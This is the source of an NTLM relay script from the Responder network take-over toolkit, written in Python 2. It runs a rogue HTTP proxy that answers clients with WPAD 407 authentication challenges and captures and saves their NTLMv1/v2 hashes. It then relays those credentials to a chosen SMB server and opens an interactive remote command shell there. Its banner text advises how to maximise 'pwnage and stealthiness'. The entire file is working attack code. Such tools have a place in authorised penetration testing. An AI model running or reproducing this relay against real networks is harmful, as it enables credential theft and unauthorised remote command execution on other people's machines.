#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys, re, os, logging, warnings, thread, optparse, time
from HTTPRelayPacket import *
from Finger import RunFinger
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))
from socket import *

__version__ = "0.2"

def UserCallBack(op, value, dmy, parser):
    args=[]
    for arg in parser.rargs:
        if arg[0] != "-":
            args.append(arg)
    if getattr(parser.values, op.dest):
        args.extend(getattr(parser.values, op.dest))
    setattr(parser.values, op.dest, args)

parser = optparse.OptionParser(usage="python %prog -t10.20.30.40 -u Administrator lgandx admin", version=__version__, prog=sys.argv[0])
parser.add_option('-t',action="store", help="Target server for SMB relay.",metavar="10.20.30.45",dest="TARGET")

parser.add_option('-u', '--UserToRelay', action="callback", callback=UserCallBack, dest="UserToRelay")

options, args = parser.parse_args()

if options.TARGET is None:
    print "\n-t Mandatory option is missing, please provide a target.\n"
    parser.print_help()
    exit(-1)
if options.UserToRelay is None:
    print "\n-u Mandatory option is missing, please provide a username to relay.\n"
    parser.print_help()
    exit(-1)

UserToRelay = options.UserToRelay
Host = options.TARGET, 445
Cmd = ""

def ShowWelcome():
    print '\n\033[1;34mResponder Proxy Auth to SMB NTLMv1/2 Relay 0.2\nSupporting NTLMv1 and NTLMv2.'
    print 'Send bugs/hugs/comments to: laurent.gaffie@gmail.com'
    print 'Usernames to relay (-u) are case sensitive.'
    print 'To kill this script hit CRTL-C or <Enter>.\033[1;31m\n'
    print 'Use this script in combination with Responder.py for best results.'
    print 'Do not to use Responder.py with -P set. This tool does the same'
    print 'than -P but with cross-protocol NTLM relay. Always target a box ' 
    print 'joined to the target domain,not the PDC as SMB signing is enabled '
    print 'by default. For optimal pwnage and stealthiness, launch Responder '
    print 'with these 2 options only: -rv \033[0m'
    print '\n\033[1;34mRelaying credentials only for these users:\033[32m'
    print UserToRelay
    print '\033[0m\n'

ShowWelcome()
Logs_Path = os.path.abspath(os.path.join(os.path.dirname(__file__)))+"/../../"

Logs = logging
Logs.basicConfig(filemode="a",filename=Logs_Path+'logs/SMBRelay-Session.txt',level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')

try:
    RunFinger(Host[0])
except:
    print "The host %s seems to be down or port 445 down."%(Host[0])
    sys.exit(1)


# Function used to write captured hashs to a file.
def WriteData(outfile, data, user):
	if not os.path.isfile(outfile):
		with open(outfile,"w") as outf:
			outf.write(data + '\n')
		return
	with open(outfile,"r") as filestr:
		if re.search(user.encode('hex'), filestr.read().encode('hex')):
			return False
		elif re.search(re.escape("$"), user):
			return False
	with open(outfile,"a") as outf2:
		outf2.write(data + '\n')

#Function used to verify if a previous auth attempt was made.
def ReadData(Outfile, Client, User, Domain, Target, cmd):
    try:
        with open(Logs_Path+"logs/"+Outfile,"r") as filestr:
            Login = Client+":"+User+":"+Domain+":"+Target+":Logon Failure"
            if re.search(Login.encode('hex'), filestr.read().encode('hex')):
                print "[+] User %s\\%s previous login attempt returned logon_failure. Not forwarding anymore to prevent account lockout\n"%(Domain,User)
                return True

            else:
                return False
    except:
        raise

def ParseHTTPHash(data, key, client):
	LMhashLen    = struct.unpack('<H',data[12:14])[0]
	LMhashOffset = struct.unpack('<H',data[16:18])[0]
	LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
	
	NthashLen    = struct.unpack('<H',data[20:22])[0]
	NthashOffset = struct.unpack('<H',data[24:26])[0]
	NTHash       = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
	
	UserLen      = struct.unpack('<H',data[36:38])[0]
	UserOffset   = struct.unpack('<H',data[40:42])[0]
	User         = data[UserOffset:UserOffset+UserLen].replace('\x00','')

	if NthashLen == 24:
		HostNameLen     = struct.unpack('<H',data[46:48])[0]
		HostNameOffset  = struct.unpack('<H',data[48:50])[0]
		HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, key.encode("hex"))
		WriteData(Logs_Path+"logs/SMB-Relay-"+client+".txt", WriteHash, User)
                print "[+] Received NTLMv1 hash from: %s"%(client)
                if User in UserToRelay:
                        print "[+] Username: %s is whitelisted, fowarding credentials."%(User)
                        if ReadData("SMBRelay-Session.txt", client, User, HostName, Host[0], cmd=None):
                           return None, None
                        else:
                	   return User, HostName
                else:
                        print "[+] Username: %s not in target list, dropping connection."%(User)
                	return None, None

	if NthashLen > 24:
		NthashLen      = 64
		DomainLen      = struct.unpack('<H',data[28:30])[0]
		DomainOffset   = struct.unpack('<H',data[32:34])[0]
		Domain         = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		HostNameLen    = struct.unpack('<H',data[44:46])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, key.encode("hex"), NTHash[:32], NTHash[32:])
		WriteData(Logs_Path+"logs/SMB-Relay-"+client+".txt", WriteHash, User)
                print "[+] Received NTLMv2 hash from: %s"%(client)
                if User in UserToRelay:
                        print "[+] Username: %s is whitelisted, fowarding credentials."%(User)
                        if ReadData("SMBRelay-Session.txt", client, User, Domain, Host[0], cmd=None):
                           return None, None
                        else:
                	   return User, Domain
                else:
                        print "[+] Username: %s not in target list, dropping connection."%(User)
                	return None, None

def longueur(payload):
	return struct.pack(">i", len(''.join(payload)))

def ExtractChallenge(data):
    SecBlobLen = struct.unpack("<h", data[43:45])[0]
    if SecBlobLen < 255:
       Challenge = data[102:110]
    if SecBlobLen > 255:
       Challenge = data[106:114]
    print "[+] Setting up HTTP Proxy with SMB challenge:", Challenge.encode("hex")
    return Challenge

def ExtractRawNTLMPacket(data):
    SecBlobLen = struct.unpack("<h", data[43:45])[0]
    SSP = re.search("NTLMSSP", data[47:]).start()
    RawNTLM = data[47+SSP:47+SecBlobLen]
    return RawNTLM

def GetSessionResponseFlags(data):
    if data[41:43] == "\x01\x00":
       print "[+] Server returned session positive, but as guest. Psexec should fail even if authentication was successful.."

def get_command():
    global Cmd
    Cmd = ""
    while len(Cmd) is 0:
       Cmd = raw_input("C:\\Windows\\system32\\:#")

def SMBKeepAlive(s, data, NextEcho = 20):
    while True:
        head = SMBHeader(cmd="\x2b",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        t = SMBEcho()
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)
        time.sleep(NextEcho)

def HTTPProxyRelay():
    so = socket(AF_INET,SOCK_STREAM)
    so.setsockopt(SOL_SOCKET,SO_REUSEADDR, 1)
    try:
        so.bind(('0.0.0.0', 3128))
        so.listen(10)
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(Host)  
        s.settimeout(30)
    except:
        "Cannot bind to port 3128, something else must be using it."
        sys.exit(1)

    try:
        while True:
            conn, addr = so.accept()
            data = conn.recv(4096)
            if not data: 
               break
            NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
	    Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\r]*', data)
	    if NTLM_Auth:
	        Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
		if Packet_NTLM == "\x01":
                        ## SMB Block. Relay PROXY NTLM NEGO to target srv.
                        h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x07\xc8")
                        n = SMBNegoCairo(Data = SMBNegoCairoData())
                        n.calculate()
                        packet0 = str(h)+str(n)
                        buffer0 = longueur(packet0)+packet0
                        s.send(buffer0)
                        smbdata = s.recv(2048)
                        ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
                        if smbdata[8:10] == "\x72\x00":
                           head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",mid="\x02\x00")
                           t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
                           t.calculate() 
                           packet1 = str(head)+str(t)
                           buffer1 = longueur(packet1)+packet1  
                           s.send(buffer1)
                           smbdata = s.recv(2048)
                        
                        ## Send HTTP Proxy 
			Buffer_Ans = WPAD_NTLM_Challenge_Ans()
			Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
                        key = ExtractChallenge(data)#Grab challenge key
			conn.send(str(Buffer_Ans))
                        data = conn.recv(8092)

                        NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
                        Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]

		        if Packet_NTLM == "\x03":
			   NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
                           Username, Domain = ParseHTTPHash(NTLM_Auth, key, addr[0])

                           if Username is not None:
                              ##Got the ntlm message 3, send it over to SMB.
                              head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",uid=smbdata[32:34],mid="\x03\x00")
                              t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)#Final relay.
                              t.calculate()
                              packet1 = str(head)+str(t)
                              buffer1 = longueur(packet1)+packet1  
                              print "[+] SMB Session Auth sent."
                              s.send(buffer1)
                              smbdata = s.recv(2048)
   	                      return smbdata, s, addr[0], Username, Domain
                           else:
                              return None, None, None, None, None
	    else:
                Response = WPAD_Auth_407_Ans()
	        conn.send(str(Response))
                data = conn.recv(4096)

    except:
        return None, None, None, None, None
 

def RunPsExec(Host):

    data, s, clientIP, Username, Domain = HTTPProxyRelay()
    if data == None:
        return False

    if data[8:10] == "\x73\x6d":
        print "[+] Relay failed, Logon Failure. This user doesn't have an account on this target.\n[+] Hashes were saved anyways in Responder/logs/ folder."
        Logs.info(clientIP+":"+Username+":"+Domain+":"+Host[0]+":Logon Failure")

    if data[8:10] == "\x73\x8d":
        print "[+] Relay failed, STATUS_TRUSTED_RELATIONSHIP_FAILURE returned. Credentials are good, but user is probably not using the target domain name in his credentials.\n"
        Logs.info(clientIP+":"+Username+":"+Domain+":"+Host[0]+":Logon Failure")

    ## Tree Connect
    if data[8:10] == "\x73\x00":
        GetSessionResponseFlags(data)#Verify if the target returned a guest session.
        head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        t = SMBTreeConnectData(Path="\\\\"+Host[0]+"\\IPC$")
        t.calculate() 
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)

    ## Fail Handling.
    if data[8:10] == "\x75\x22":
        print "[+] Tree Connect AndX denied. SMB Signing is likely mandatory on the target, or low privilege user.\n[+] Hashes were saved anyways in Responder/logs/ folder."
        return False

    ## NtCreateAndx
    if data[8:10] == "\x75\x00":
        print "[+] Authenticated.\n[+] Dropping into Responder's interactive shell, type \"exit\" to terminate\n"

    while True:
        if data[8:10] == "\x75\x00":
            thread.start_new_thread(SMBKeepAlive, (s,data, 15)) #keep it alive every 15 secs.
            thread.start_new_thread(get_command, ())
            while Cmd == "":
                pass

            if Cmd == "exit":
               sys.exit(1)

            data = RunCmd(data, s, clientIP, Username, Domain, Cmd, Logs, Host)

        if data is None:
           print "\033[1;31m\nSomething went wrong, the server dropped the connection. Make sure to clean the server (\\Windows\\Temp\\)\033[0m\n"

        if data[8:10] == "\x2d\x34":#Confirmed with OpenAndX that no file remains.
            head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
            t = SMBTreeConnectData(Path="\\\\"+Host[0]+"\\IPC$")
            t.calculate() 
            packet1 = str(head)+str(t)
            buffer1 = longueur(packet1)+packet1  
            s.send(buffer1)
            data = s.recv(2048)
            Cmd2 = raw_input("C:\\Windows\\system32\\:#")

            while len(Cmd2) is 0:
                Cmd2 = raw_input("C:\\Windows\\system32\\:#")

            if Cmd2 == "exit":
               sys.exit(1)

            data = RunCmd(data, s, clientIP, Username, Domain, Cmd2, Logs, Host)

    if data[8:10] == "\x2d\x00":
       print "[*] File still exist (Windows\\Temp\\Results.txt), server's not playing nicely."


def main():
    try:
        num_thrd = 1
        while num_thrd > 0:
            RunPsExec(Host)
            time.sleep(1)
    except KeyboardInterrupt:
        exit()

if __name__ == '__main__':
    try:
        main()
    except:
        raise
